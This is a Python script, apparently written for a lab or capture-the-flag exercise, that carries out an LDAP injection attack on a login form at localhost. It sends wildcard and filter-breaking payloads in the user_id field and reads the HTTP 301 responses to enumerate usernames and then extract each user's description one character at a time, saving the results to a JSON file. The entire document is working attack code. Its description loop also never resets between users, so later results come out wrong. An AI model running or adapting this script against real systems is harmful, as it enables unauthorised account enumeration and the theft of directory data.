#!/usr/bin/python3
import requests
import time
import sys
import signal
import string
import json
from pwn import *
 
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n");
    sys.exit(1)
 
# Ctrl-C
signal.signal(signal.SIGINT, def_handler)
 
# Variables globales
main_url = "http://localhost:8888/"
burp = {'http': 'http://127.0.0.1:8080'}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
def getUserInitials():
    
    characters = string.ascii_lowercase + string.digits
    initial_users = []
 
    for character in characters:
 
        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
 
        if r.status_code == 301:
            initial_users.append(character)
 
    return initial_users
 
def getUsers(initial_users):
    characters = string.ascii_lowercase + string.digits
    valid_users = []
    p2 = log.progress("Enumeración de usuarios")
    p2.status("Recolenctando nombres de usuarios del servidor")
    for first_char in initial_users:
        user = first_char
        for position in range(0, 15):
            for character in characters:
 
                post_data = "user_id={}{}*&password=*&login=1&submit=Submit".format(user,character)
                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
 
                if r.status_code == 301:
                    user += character
                    break
        valid_users.append(user)
    p2.success("Los usuarios encontrados son: %s" % valid_users)
    return valid_users
 
def getDescription(valid_users):
    users_and_descriptions = []
    characters = string.ascii_lowercase
    description = ""
    p2 = log.progress("Enumeracion de descripciones")
    for user in valid_users:
        p2.status("Extrayendo descripcion del usuario > %s" % user)
        for position in range(0, 50):
            for character in characters:
 
                post_data = "user_id={}*)(description={}{}*))%00&password=*&login=1&submit=Submit".format(user, description, character)
                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
 
                if r.status_code == 301:
                    description += character
                    break
        user_description = {
                "user": user,
                "description": description
            }
        users_and_descriptions.append(user_description)
 
    p2.success("Lista de usuarios con sus descripciones extraídas con éxito.")
    return users_and_descriptions
 
def save_data_to_json(users_and_descriptions):
    with open("data.json", "w") as outfile:
        json.dump(users_and_descriptions, outfile, indent=4, sort_keys=False)
    
    print("[+] Datos exportados al fichero data.json")
 
if __name__ == "__main__":
    p1 = log.progress("Iniciando LDAP Brute-Force Attack")
    initial_users = getUserInitials()
    valid_users = getUsers(initial_users)
    users_and_descriptions = getDescription(valid_users)
    save_data_to_json(users_and_descriptions)
    p1.success("Proceso de LDAP Brute-Force Attack finalizado")